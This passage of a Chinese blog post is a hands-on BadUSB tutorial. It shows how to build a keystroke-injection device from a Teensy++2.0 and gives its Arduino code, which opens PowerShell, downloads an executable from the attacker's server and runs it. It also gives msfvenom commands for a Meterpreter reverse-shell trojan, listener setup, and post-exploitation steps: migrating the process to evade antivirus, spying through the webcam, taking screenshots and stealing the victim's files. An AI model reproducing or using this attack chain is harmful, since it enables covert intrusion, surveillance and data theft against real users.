InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）攻击的一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。也就是说，这种攻击是通过模拟键盘和鼠标等计算机与人进行交互的硬件去发动攻击的.在模拟成为键盘后控制电脑执行内置语句.那么理论上来讲就没有可以破解这种攻击是杀毒软件，不过360是有这方面的防护的，比如变形虫，但是经实测360的变形虫并不能特别有效防御我们基于teensy的badusb，当防护功能检测到USB设备的可疑行为时，会通过弹窗对用户进行提醒，用户可根据情况自行决定信任USB设备或拦截可疑行为。某种意义上这也算防御.</h2><h2 id="HID攻击分为很多种，例如Teensy和USB-RUBBER-DUCKY（usb橡皮鸭）"><a href="#HID攻击分为很多种，例如Teensy和USB-RUBBER-DUCKY（usb橡皮鸭）" class="headerlink" title="HID攻击分为很多种，例如Teensy和USB RUBBER DUCKY（usb橡皮鸭）"></a>HID攻击分为很多种，例如Teensy和USB RUBBER DUCKY（usb橡皮鸭）</h2><h2 id="我来分别介绍介绍两种不同攻击的优势与劣势"><a href="#我来分别介绍介绍两种不同攻击的优势与劣势" class="headerlink" title="我来分别介绍介绍两种不同攻击的优势与劣势"></a>我来分别介绍介绍两种不同攻击的优势与劣势</h2><h3 id="Usb橡皮鸭它最初作为一个IT自动化的POC，通过嵌入式开发板实现的，后来它发展成为一个成熟的商业化按键注入攻击平台。USB橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装能力，成功的成为了极客们必不可少的工具，十分的方便，但是它贵啊-HAK5网站上的大黄鸭更是动不动就几十美刀，不过其实有很多HACK5的工具完全可以自制"><a href="#Usb橡皮鸭它最初作为一个IT自动化的POC，通过嵌入式开发板实现的，后来它发展成为一个成熟的商业化按键注入攻击平台。USB橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装能力，成功的成为了极客们必不可少的工具，十分的方便，但是它贵啊-HAK5网站上的大黄鸭更是动不动就几十美刀，不过其实有很多HACK5的工具完全可以自制" class="headerlink" title="Usb橡皮鸭它最初作为一个IT自动化的POC，通过嵌入式开发板实现的，后来它发展成为一个成熟的商业化按键注入攻击平台。USB橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装能力，成功的成为了极客们必不可少的工具，十分的方便，但是它贵啊.HAK5网站上的大黄鸭更是动不动就几十美刀，不过其实有很多HACK5的工具完全可以自制."></a>Usb橡皮鸭它最初作为一个IT自动化的POC，通过嵌入式开发板实现的，后来它发展成为一个成熟的商业化按键注入攻击平台。USB橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装能力，成功的成为了极客们必不可少的工具，十分的方便，但是它贵啊.HAK5网站上的大黄鸭更是动不动就几十美刀，不过其实有很多HACK5的工具完全可以自制.</h3><h3 id="Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程可以通过USB端口进行或者使用ISP接口进行编程的。多方便，而且它的体积就两个角硬币那么大，同时可以模拟多种硬件，还有多余的I-O口可以供极客们随意改装-它的价格也是十分的便宜-就20RMB就可以入手啦，作者这里用的是Teensy-2-0"><a href="#Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程可以通过USB端口进行或者使用ISP接口进行编程的。多方便，而且它的体积就两个角硬币那么大，同时可以模拟多种硬件，还有多余的I-O口可以供极客们随意改装-它的价格也是十分的便宜-就20RMB就可以入手啦，作者这里用的是Teensy-2-0" class="headerlink" title="Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程可以通过USB端口进行或者使用ISP接口进行编程的。多方便，而且它的体积就两个角硬币那么大，同时可以模拟多种硬件，还有多余的I/O口可以供极客们随意改装.它的价格也是十分的便宜.就20RMB就可以入手啦，作者这里用的是Teensy++2.0"></a>Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程可以通过USB端口进行或者使用ISP接口进行编程的。多方便，而且它的体积就两个角硬币那么大，同时可以模拟多种硬件，还有多余的I/O口可以供极客们随意改装.它的价格也是十分的便宜.就20RMB就可以入手啦，作者这里用的是Teensy++2.0</h3><h2 id="综合以上来讲，本片文章使用Teensy-2-0-usb大黄鸭如果有朋友想看我以后也会更新"><a href="#综合以上来讲，本片文章使用Teensy-2-0-usb大黄鸭如果有朋友想看我以后也会更新" class="headerlink" title="综合以上来讲，本片文章使用Teensy++2.0,usb大黄鸭如果有朋友想看我以后也会更新."></a>综合以上来讲，本片文章使用Teensy++2.0,usb大黄鸭如果有朋友想看我以后也会更新.</h2><h1 id="00x2基于Teensy-2-0的Badusb的制作"><a href="#00x2基于Teensy-2-0的Badusb的制作" class="headerlink" title="00x2基于Teensy++2.0的Badusb的制作"></a>00x2基于Teensy++2.0的Badusb的制作</h1><h1 id="00x3-准备工作"><a href="#00x3-准备工作" class="headerlink" title="00x3 准备工作"></a>00x3 准备工作</h1><h3 id="1-某宝购买一块Teensy-2-0"><a href="#1-某宝购买一块Teensy-2-0" class="headerlink" title="* 1.某宝购买一块Teensy++2.0"></a>* 1.某宝购买一块Teensy++2.0</h3><h3 id="2-一根mini-USB转USB的线（推荐使用较短的线或使用OTG转接头-）"><a href="#2-一根mini-USB转USB的线（推荐使用较短的线或使用OTG转接头-）" class="headerlink" title="* 2.一根mini-USB转USB的线（推荐使用较短的线或使用OTG转接头.）"></a>* 2.一根mini-USB转USB的线（推荐使用较短的线或使用OTG转接头.）</h3><h3 id="3-（可有可无）最好你要有一台有公网IP的VPS服务器用来下载木马-没有的话应该也可以用Github来代替"><a href="#3-（可有可无）最好你要有一台有公网IP的VPS服务器用来下载木马-没有的话应该也可以用Github来代替" class="headerlink" title="* 3.（可有可无）最好你要有一台有公网IP的VPS服务器用来下载木马.没有的话应该也可以用Github来代替"></a>* 3.（可有可无）最好你要有一台有公网IP的VPS服务器用来下载木马.没有的话应该也可以用Github来代替</h3><h3 id="4-CS或Kali中MSF的环境"><a href="#4-CS或Kali中MSF的环境" class="headerlink" title="* 4.CS或Kali中MSF的环境"></a>* 4.CS或Kali中MSF的环境</h3><h3 id="5-Teensy是可以使用Arduino自带的IDE来编辑的，不过需安装Teensyduino驱动"><a href="#5-Teensy是可以使用Arduino自带的IDE来编辑的，不过需安装Teensyduino驱动" class="headerlink" title="* 5.Teensy是可以使用Arduino自带的IDE来编辑的，不过需安装Teensyduino驱动"></a>* 5.Teensy是可以使用Arduino自带的IDE来编辑的，不过需安装Teensyduino驱动</h3>Arduino下载地址（国内论坛）<a href="https://www.arduino.cn/thread-5838-1-1.html">https://www.arduino.cn/thread-5838-1-1.html</a><br>Arduino官方下载地址<a href="https://www.arduino.cc/en/Main/Software">https://www.arduino.cc/en/Main/Software</a>(不建议，慢到你怀疑人生.)<br>Teensyduino驱动下载地址(官网，不推荐太慢了，不过是最新版，没有IDE版本的限制)<a href="https://www.pjrc.com/teensy/td_151/TeensyduinoInstall.exe">https://www.pjrc.com/teensy/td_151/TeensyduinoInstall.exe</a><br>作者百度云下载&lt;速度会稍微快点，此版本截至2020年3月8日版本号为1.44&gt;（此版本不是最新版，所以只能使用以下几个版本的IDE1.0.6/1.6.5-r5/1.8.1/1.8.5/1.8.6/1.8.7）<br><a href="https://pan.baidu.com/s/1-lUFnScN7j8JVL1oOXGEPA">https:/pan.baidu.com/s/1-lUFnScN7j8JVL1oOXGEPA</a>提取码：8cte</li></ul><h3 id="下载完成后进行安装即可，安装时记得记住你的Arduino安装的地址！后面要用到！"><a href="#下载完成后进行安装即可，安装时记得记住你的Arduino安装的地址！后面要用到！" class="headerlink" title="下载完成后进行安装即可，安装时记得记住你的Arduino安装的地址！后面要用到！"></a>下载完成后进行安装即可，安装时记得记住你的Arduino安装的地址！后面要用到！</h3><h3 id="在这里主要讲下Teensyduino驱动的安装方法"><a href="#在这里主要讲下Teensyduino驱动的安装方法" class="headerlink" title="在这里主要讲下Teensyduino驱动的安装方法"></a>在这里主要讲下Teensyduino驱动的安装方法</h3><p>1.首先解压文件包<br>2.如图打开文件<br><img src="https://i.loli.net/2020/03/08/FXPjmnedB6Mr7o2.png" alt="1.png"><br>3.点击Next<br><img src="https://i.loli.net/2020/03/08/XcPT62HRbnN83ID.png" alt="2.png">  </p><h3 id="我这里是Windows10已经安装了相关的驱动，所以不需要重新安装"><a href="#我这里是Windows10已经安装了相关的驱动，所以不需要重新安装" class="headerlink" title="我这里是Windows10已经安装了相关的驱动，所以不需要重新安装"></a>我这里是Windows10已经安装了相关的驱动，所以不需要重新安装</h3><h3 id="4-点击Next，在这里选择你Arduino安装的地址-注意这里有两种情况！"><a href="#4-点击Next，在这里选择你Arduino安装的地址-注意这里有两种情况！" class="headerlink" title="4.点击Next，在这里选择你Arduino安装的地址(注意这里有两种情况！)"></a>4.点击Next，在这里选择你Arduino安装的地址(注意这里有两种情况！)</h3><p><img src="https://i.loli.net/2020/03/08/Qzutik5snOfrg9L.png" alt="3.1.png"><br>如果你的情况如图所示，next不可点击，那么请你返回到Arduino下载的位置<br>下载和你对应的Teensyduino的version<br>点击问号我们可以发现<br><img src="https://i.loli.net/2020/03/08/GsSCcoxJuE68Ori.png" alt="QQ截图20200307213050.png"><br>1.44版本Teensyduino的驱动只能支持上面所提到的几个版本，所以只能使用上面几个版本的ArduinoIDE<br>当你下载完成后，出现的情况应该如图所示<br><img src="https://i.loli.net/2020/03/08/fjckWTq6A2Shnur.png" alt="3.2.png"><br>5.我们点击Next继续，选择ALL之后点击Next<br><img src="https://i.loli.net/2020/03/08/kQrSejHK5EYcmVw.png" alt="QQ截图20200307215042.png"><br>6.等待进度条走完后，出现如图所示画面即代表你安装成功.<br><img src="https://i.loli.net/2020/03/08/MiolmRDjKLCQvGV.png" alt="QQ截图20200307215120.png"><br>至此我们的准备工作也已经做好了.</p><h1 id="00x4-5-程序的编写与制作"><a href="#00x4-5-程序的编写与制作" class="headerlink" title="00x4/5 程序的编写与制作"></a>00x4/5 程序的编写与制作</h1><h2 id="我们在利用BadUSB去继续HID攻击时一般通过Cobalt-Strike（简称CS）或MSF5去进行与受攻击的主机的连接和Shell反弹，在本篇文章中我们两者都会介绍-后面还有一些更骚的操作"><a href="#我们在利用BadUSB去继续HID攻击时一般通过Cobalt-Strike（简称CS）或MSF5去进行与受攻击的主机的连接和Shell反弹，在本篇文章中我们两者都会介绍-后面还有一些更骚的操作" class="headerlink" title="我们在利用BadUSB去继续HID攻击时一般通过Cobalt Strike（简称CS）或MSF5去进行与受攻击的主机的连接和Shell反弹，在本篇文章中我们两者都会介绍.后面还有一些更骚的操作."></a>我们在利用BadUSB去继续HID攻击时一般通过Cobalt Strike（简称CS）或MSF5去进行与受攻击的主机的连接和Shell反弹，在本篇文章中我们两者都会介绍.后面还有一些更骚的操作.</h2><h1 id="00x4-1利用MSF配合BadUSB进行攻击"><a href="#00x4-1利用MSF配合BadUSB进行攻击" class="headerlink" title="00x4.1利用MSF配合BadUSB进行攻击"></a>00x4.1利用MSF配合BadUSB进行攻击</h1><h3 id="什么是MSF"><a href="#什么是MSF" class="headerlink" title="什么是MSF?"></a>什么是MSF?</h3><p>MSF它是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。本身附带数百个已知软件漏洞的专业级漏洞攻击工具。是信息收集、漏洞扫描、权限提升、内网渗透等集成的工具。MSF也可以轻松完成提权渗透,shell反弹等功能，是渗透测试人员不可或缺的工具。</p><h3 id="在kali上利用MSF5生成木马"><a href="#在kali上利用MSF5生成木马" class="headerlink" title="在kali上利用MSF5生成木马."></a>在kali上利用MSF5生成木马.</h3><h2 id="注意！"><a href="#注意！" class="headerlink" title="注意！"></a>注意！</h2><h3 id="新版kali在更新后（date-2020年3月8日），msf的bundler库的版本不是原来的库了，如图"><a href="#新版kali在更新后（date-2020年3月8日），msf的bundler库的版本不是原来的库了，如图" class="headerlink" title="新版kali在更新后（date:2020年3月8日），msf的bundler库的版本不是原来的库了，如图"></a>新版kali在更新后（date:2020年3月8日），msf的bundler库的版本不是原来的库了，如图</h3><p><img src="https://i.loli.net/2020/03/08/wdfqVF14EQjCWnN.png" alt="QQ截图20200308155342.png"><br>由于默认安装的bundler为最新版本2.1.4。msfconsole依赖的版本为1.17.3，所以需要安装旧版本。<br>执行如下命令 gem install bundler:1.17.3<br>但是当你执行后你会发现连接不上或者无法下载..<br>所以怎么办呢，作者经过搜索后发现了原因竟是GFW把站给墙了…<br>既然如此我们就需要更换网址了<br>解决方法如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gem sources --add https:&#x2F;&#x2F;gems.ruby-china.com&#x2F; --remove https:&#x2F;&#x2F;rubygems.org&#x2F;  </span><br><span class="line">gem sources -l https:&#x2F;&#x2F;gems.ruby-china.com  </span><br></pre></td></tr></table></figure><p>这样更换网址之后就可以使用<code>gem install bundler:1.17.3</code>了<br>如果有的朋友依然连不上，就比如我，那么就要检查VM虚拟机或者是kali本地机子的网络设置了<br>可能是以下情况，输入curl <a href="https://gems.ruby-china.com/">https://gems.ruby-china.com</a> 无法访问，那么你就需要改你的DNS设置了（在这里感谢Señor.ME）<br><img src="https://i.loli.net/2020/03/08/S9EnbstZudKGv5O.png" alt="QQ图片20200308173136.png"><br>操作前的准备：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在设置里将Kali的上网模式设置成“桥接模式”。</span><br><span class="line">阿里公共DNS(官网：http:&#x2F;&#x2F;www.alidns.com&#x2F;)：</span><br><span class="line">233.5.5.5</span><br><span class="line">233.6.6.6</span><br><span class="line">或者是百度的DNS</span><br><span class="line">然后用leafpad打开DNS配置文件</span><br><span class="line">leafpad &#x2F;etc&#x2F;resolv.conf</span><br><span class="line">将里面的内容改为</span><br><span class="line">nameserver 223.5.5.5</span><br><span class="line">nameserver 223.6.6.6</span><br><span class="line">之后reboot就生效了</span><br></pre></td></tr></table></figure><p>之后你再curl <a href="https://gems.ruby-china.com/">https://gems.ruby-china.com</a> 就可以看到如图的情况了<br><img src="https://i.loli.net/2020/03/08/rFwzMgKvat2Dbc8.png" alt="QQ截图20200308173932.png"><br>应该就ok了，如果还不行就找以前的iso重装吧，解决一切.</p><h3 id="我们回到MSF生成木马的步骤来"><a href="#我们回到MSF生成木马的步骤来" class="headerlink" title="我们回到MSF生成木马的步骤来"></a>我们回到MSF生成木马的步骤来</h3><ol><li>打开Kali的命令行输入msfconsole，如图，现在的Kali已经更新到MSF5啦<br><img src="https://i.loli.net/2020/03/09/Miy8ZJOF5oABqHv.png" alt="QQ截图20200309015202.png">  </li><li>再新建一个窗口，输入ifconfig或者是ip add 查看本地的IP<br><img src="https://i.loli.net/2020/03/09/sWTvdNwz2p6ki5K.png" alt="QQ截图20200309015721.png">  </li><li>然后回到我们启动msf的命令行，输入生成木马的指令（windows系统）  </li></ol><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -f exe -o xxx.exe</p><p> LHOST=后面的部分放上你本地的IP<br> LPORT=后面的部分放上你用于接受响应的端口<br> .exe前放上你所想要的文件名<br> 而在我们这就应该是  </p><p> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.134 LPORT=8888 -f exe -o 1.exe</p><p> 如图<br><img src="https://i.loli.net/2020/03/09/CpqH8vyUiAWGEPk.png" alt="QQ截图20200309020502.png"><br>4. 按下回车运行，并用vmtools复制到虚拟机外（vmtools不会安装的朋友就自己百度安装下）<br><img src="https://i.loli.net/2020/03/09/gU8zNToLfwvc9WB.png" alt="QQ截图20200309020717.png"><br>如图，已经提示生成完成，新建一个命令行找到文件并复制到桌面（其实一开始就可以直接在桌面运行msf）输入ls查看文件<br><img src="https://i.loli.net/2020/03/09/2TXdtUPGnRIyE4W.png" alt="QQ图片20200309020959.png"><br>使用cp命令复制到桌面方便直接拖到虚拟机外<br>  <img src="https://i.loli.net/2020/03/09/Fp9Ab32VCxyfDU6.png" alt="QQ截图20200309021424.png"><br>这个时候你在虚拟机外就可以看见我们所生成的木马文件了（1.exe）<br><img src="https://i.loli.net/2020/03/09/DBmw3UxEPZzSMv8.png" alt="QQ截图20200309021452.png"><br>我们直接托到虚拟机外即可（BTW：这里博主因为Vm-tools的关系直接换到2019.4版本了,2019.4的GNOME版本还是很好看滴.）  </p><h3 id="这样我们的木马就生成完成了"><a href="#这样我们的木马就生成完成了" class="headerlink" title="这样我们的木马就生成完成了"></a>这样我们的木马就生成完成了</h3><h4 id="我们接下来进入监听模块"><a href="#我们接下来进入监听模块" class="headerlink" title="我们接下来进入监听模块"></a>我们接下来进入监听模块</h4><p>1.输入msfconsole打开msf<br>2.输入use exploit/multi/handler打开监听模块<br><img src="https://i.loli.net/2020/03/09/uynDFJGj8iCE7N6.png" alt="QQ截图20200309194641.png"><br>3.输入set payload windows/meterpreter/reverse_tcp设置payload<br><img src="https://i.loli.net/2020/03/10/XnTHZYoxcsWE9K6.png" alt="QQ截图20200310060810.png"><br>4.输入show options 查看需要设置的参数<br><img src="https://i.loli.net/2020/03/09/bCgXGkVJxUohz9j.png" alt="QQ截图20200309195927.png"><br>5.分别设置监听端口与ip(设置LHOST、LPORT参数)<br>set lhost 192.168.31.143 （这里填写你自己的ip）<br>set lport 8888<br><img src="https://i.loli.net/2020/03/09/taoubpSeGk9vZlE.png" alt="QQ截图20200309200349.png"><br>再输入show options 已经可以看到所有的参数都设置好了<br><img src="https://i.loli.net/2020/03/09/wbqmS12ath4njXY.png" alt="QQ截图20200309200456.png"><br>输入run或是exploit开始监听<br><img src="https://i.loli.net/2020/03/09/i5qOylgetf2xGkK.png" alt="QQ截图20200309200701.png"><br>然后我们KALI环境就配置好了，现在的问题就是怎么利用Badusb让受攻击主机执行木马<br>（如果我们在虚拟机外点击木马，我们的KALI应该是可以收到响应的,如图。一会我也会教大家怎么做后渗透与清理战场.<br><img src="https://i.loli.net/2020/03/10/AXDixF4ta9J8m6B.png" alt="QQ截图20200310061446.png">   </p><h3 id="好了让我们来编写，并上传我们的badusb的程序吧"><a href="#好了让我们来编写，并上传我们的badusb的程序吧" class="headerlink" title="好了让我们来编写，并上传我们的badusb的程序吧."></a>好了让我们来编写，并上传我们的badusb的程序吧.</h3><ol><li><p>首先打开Arduino的IDE<br><img src="https://i.loli.net/2020/03/10/CzoRl21GI7r8aBt.png" alt="QQ截图20200310062142.png">   </p></li><li><p>然后在（工具&gt;开发板）中选择Teensy++2.0<br>在（工具&gt;USB Type）中选择Serial+Keyboard+Mouse+Joystick（这个可以按需求来）<br>剩下的两个CPU Speed和Keyboard Layout一般不需要你修改<br>把COM口选成你对应的COM口，在（右键此电脑&gt;设备管理器&gt;端口)中找  </p></li><li><p>接下来就可以编写我们的用Powershell下载木马的程序了，这里作者用的是远程服务器下载木马  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### 程序如下</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line">  #include &lt;Keyboard.h&gt;  </span><br><span class="line">  void setup() &#123;  </span><br><span class="line">  Keyboard.begin();&#x2F;&#x2F;开始键盘通讯  </span><br><span class="line">  delay(10000);&#x2F;&#x2F;延时单位是ms，做测试可以调长一点方便你利用这个时间来下载程序.不然你会哭的.测试完后就可以改为1000ms了  </span><br><span class="line">  Keyboard.press(KEY_LEFT_GUI);&#x2F;&#x2F;按下win键  </span><br><span class="line">  delay(200);&#x2F;&#x2F;延时500ms,这里的所有延时都要根据实际情况来讲，太短有可能使程序运行失败   </span><br><span class="line">  Keyboard.press(&#39;r&#39;);&#x2F;&#x2F;按下r键     </span><br><span class="line">  delay(700);&#x2F;&#x2F;延时500ms    </span><br><span class="line">  Keyboard.release(KEY_LEFT_GUI);&#x2F;&#x2F;松开win键   </span><br><span class="line">  Keyboard.release(&#39;r&#39;);&#x2F;&#x2F;松开r键    </span><br><span class="line">  Keyboard.press(KEY_CAPS_LOCK);&#x2F;&#x2F;按下大写键    </span><br><span class="line">  Keyboard.release(KEY_CAPS_LOCK);&#x2F;&#x2F;松开大写键    </span><br><span class="line">  delay(700);&#x2F;&#x2F;延时500ms    </span><br><span class="line">  Keyboard.println(&quot;powershell&quot;);&#x2F;&#x2F;输入powershell </span><br><span class="line">  delay(700);&#x2F;&#x2F;延时500ms   </span><br><span class="line">  Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车    </span><br><span class="line">  Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">  delay(700);&#x2F;&#x2F;延时500ms  </span><br><span class="line">  Keyboard.press(KEY_CAPS_LOCK);&#x2F;&#x2F;按下大写键    </span><br><span class="line">  Keyboard.release(KEY_CAPS_LOCK);&#x2F;&#x2F;松开大写键  </span><br><span class="line">  delay(700);&#x2F;&#x2F;延时500ms  </span><br><span class="line">  Keyboard.println(&quot;powershell (new-object System.Net.WebClient).DownloadFile( &#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;1.exe&#39;,&#39;D:\\1.exe&#39;)&quot;);   </span><br><span class="line">  &#x2F;&#x2F;上面这条语句是利用powershell下载木马的语句，按照我的标注来就行了，xxx.exe是你自己木马的名字  </span><br><span class="line">  Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车  </span><br><span class="line">  Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">  Keyboard.println(&quot;START D:\\1.exe&quot;);&#x2F;&#x2F;执行你下载的文件  </span><br><span class="line">  delay(300);&#x2F;&#x2F;延时300ms  </span><br><span class="line">  Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line">  Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车   </span><br><span class="line">  delay(200);&#x2F;&#x2F;延时200ms    </span><br><span class="line">  Keyboard.end();&#x2F;&#x2F;结束键盘通讯   </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  void loop()&#x2F;&#x2F;循环  </span><br><span class="line">  &#123;  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="这样我们的badusb的程序就写完啦，简单来说就是利用powershell下载程序并打开"><a href="#这样我们的badusb的程序就写完啦，简单来说就是利用powershell下载程序并打开" class="headerlink" title="这样我们的badusb的程序就写完啦，简单来说就是利用powershell下载程序并打开."></a>这样我们的badusb的程序就写完啦，简单来说就是利用powershell下载程序并打开.</h3><h3 id="然后我们就可以开始烧录程序了"><a href="#然后我们就可以开始烧录程序了" class="headerlink" title="然后我们就可以开始烧录程序了."></a>然后我们就可以开始烧录程序了.</h3><p>当然我们就需要用ftp将木马上传至你的服务器（这个我就不教了.太基础了下个Xftp拖进去就行）<br>然后我们的服务器需要开启httpd，并把xxx.exe放置到服务器访问页面根目录（方便我们下载）<br>当你上传完并把程序做好相应的修改后，我们就可以来烧录啦！  </p></li><li><p>打开Arduino程序  </p></li><li><p>将我的代码复制进去，并做相应修改.  </p></li><li><p>如图，先点击验证，再点击上传<br><img src="https://i.loli.net/2020/03/11/hNiL8TJqVbsekfR.png" alt="QQ图片20200311071527.png">   </p></li><li><p>按下板子上的按钮，重启并烧录主板<br><img src="https://i.loli.net/2020/03/08/f8kHwWxSIZy2lEY.jpg" alt="timg1.jpg">  </p></li><li><p>当你在Arduino端按下”烧录键”之后你会看到我们的Teensyduino弹出<br><img src="https://i.loli.net/2020/03/11/TvGLAuwymjaRN3Q.png" alt="QQ截图20200311072314.png"><br>这是提示让你按下按键进入编程模式  </p></li><li><p>Teensyduino功能介绍如图所示<br><img src="https://i.loli.net/2020/03/11/GLme4gnRiuhcZv2.png" alt="QQ截图20200311072218.png">  </p></li><li><p>当你看到”Reboot OK”时，你的程序就烧录好啦.<br><img src="https://i.loli.net/2020/03/11/skCRI8pwB7uHf4J.png" alt="QQ截图20200311072333.png">  </p><h3 id="现在你就可以拔下主板，然后重新插入，看看我们制作的成果啦"><a href="#现在你就可以拔下主板，然后重新插入，看看我们制作的成果啦" class="headerlink" title="现在你就可以拔下主板，然后重新插入，看看我们制作的成果啦."></a>现在你就可以拔下主板，然后重新插入，看看我们制作的成果啦.</h3><h2 id="那我们现在就可以开始利用MSF后渗透了"><a href="#那我们现在就可以开始利用MSF后渗透了" class="headerlink" title="那我们现在就可以开始利用MSF后渗透了"></a>那我们现在就可以开始利用MSF后渗透了</h2><p><img src="https://i.loli.net/2020/03/11/InaYAfTZBGMgWpP.png" alt="QQ截图20200311080524.png">  </p></li><li><p>先getpid查看我们的shell所在的进程，为转移进程做准备<br><img src="https://i.loli.net/2020/03/11/Tuz2Es7CV1yLSHD.png" alt="QQ截图20200311091935.png">  </p></li><li><p>转移进程，这一步分为两种方法（自动转移进程和手动转移进程）<br>先ps查看进程.<br><img src="https://i.loli.net/2020/03/11/BNixMgFJZta21I5.png" alt="QQ截图20200311093959.png"><br>我们也可以根据PID号找到我们的进程<br><img src="https://i.loli.net/2020/03/11/cPY6zWo1ryeUEO8.png" alt="QQ截图20200311094041.png"><br>手动迁移进程的命令migrate PID（手动迁移进程需要注意权限，最好能迁移到system权限的进程上.）<br>自动迁移进程的命令run post/windows/manage/migrate（脚本帮你自动选择比较方便）<br>如图<br><img src="https://i.loli.net/2020/03/11/7jNeMT8brCKS3Ug.png" alt="QQ截图20200311094734.png"><br>这样我们的进程就迁移到了pid为20424的进程上，原来的进程也被关闭了（此时杀毒软件已经扫不出来了，在我们没有迁移进程前，我们的进程会被识别成后门） ~</p></li></ol><p><img src="https://i.loli.net/2020/03/11/rPYqxm7bTQgDiIl.png" alt="QQ截图20200311095934.png"><br><img src="https://i.loli.net/2020/03/11/Twq1oE4Y9lQdbvu.png" alt="QQ截图20200311100424.png"><br>可以看到我们的进程被转移到了记事本这个程序上，还有system权限，现在我们就已经完成了进程转移的工作啦.<br>3. 判断目标靶机是否为虚拟机run post/windows/gather/checkvm 如图<br><img src="https://i.loli.net/2020/03/11/rdN9jVULGoPihwR.png" alt="QQ截图20200311102423.png"><br>我这边是用的物理机，所以提示也是物理机。如果是虚拟机那么就要小心是蜜罐了.<br>4. 获得主机信息sysinfo<br><img src="https://i.loli.net/2020/03/11/1lX3KB26wZILzon.png" alt="QQ截图20200311102643.png"><br>这样就可以看见我们的主机的情况了.<br>5. 我们可以使用route命令查看靶机的路由表<br><img src="https://i.loli.net/2020/03/11/WupM6v4hEPTVFIH.png" alt="QQ截图20200311104125.png"><br>也可以进行进一步的内网渗透.<br>6. 现在我们可以留个后门，也可以先放到后台<br>比如输入background就可以把会话放到后台，在输入(sessions -i 数字)调用回来<br><img src="https://i.loli.net/2020/03/12/zaWTxGfotF2uLAy.png" alt="QQ截图20200312082836.png"><br>7. 我们还可以去打开摄像头之类的，也可以盗取用户文件，那我们这里就以盗取一张照片结束吧.<br>就这张啦.<br><img src="https://i.loli.net/2020/03/12/3vyAUmPW9qZoXdE.png" alt="QQ截图20200312083201.png"><br>我们可以先输入shell进入windows下的cmd,然后切换到指定目录,再用dir列举.<br>最后利用download语句就ok啦<br><img src="https://i.loli.net/2020/03/12/KQS8lfqd9YuBHZr.png" alt="QQ截图20200312084009.png"><br>8. 再分享几个有意思的操作，我们的后渗透就介绍到这里.<br>8.1webcam_list  #查看靶机是否有摄像头<br>webcam_snap  #打开靶机摄像头拍一张照片<br>webcam_stream #开启直播模式，抓取视频<br>上面三个容易被拦截.下面两个是不会的<br>8.2upload # 上传文件到目标机上<br>download # 下载文件到本机上<br>8.3 screenshot截屏<br>到这我们基础的badusb配合MSF就完成了，下一篇我会给大家介绍关于Badusb配合CS的用法</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 近源渗透 </category>
          
          <category> badusb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 近源渗透 </tag>
            
            <tag> badusb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>badusb第五期</title>
      <link href="2020/11/08/badusb%E7%AC%AC%E4%BA%94%E6%9C%9F/"/>
      <url>2020/11/08/badusb%E7%AC%AC%E4%BA%94%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HID攻击之Badusb-全面的带你了解Badusb五种的花样玩法"><a href="#HID攻击之Badusb-全面的带你了解Badusb五种的花样玩法" class="headerlink" title="HID攻击之Badusb(全面的带你了解Badusb五种的花样玩法.)"></a>HID攻击之Badusb(全面的带你了解Badusb五种的花样玩法.)</h1><h3 id="文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-74-111-67-x61-x74-87-70-89-64-x31-54-51-46-99-111-109"><a href="#文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-74-111-67-x61-x74-87-70-89-64-x31-54-51-46-99-111-109" class="headerlink" title="文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系&#74;&#111;&#67;&#x61;&#x74;&#87;&#70;&#89;&#64;&#x31;&#54;&#51;&#46;&#99;&#111;&#109;"></a>文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#74;&#111;&#67;&#x61;&#x74;&#87;&#70;&#89;&#64;&#x31;&#54;&#51;&#46;&#99;&#111;&#109;">&#74;&#111;&#67;&#x61;&#x74;&#87;&#70;&#89;&#64;&#x31;&#54;&#51;&#46;&#99;&#111;&#109;</a></h3><h3 id="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"><a href="#本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点" class="headerlink" 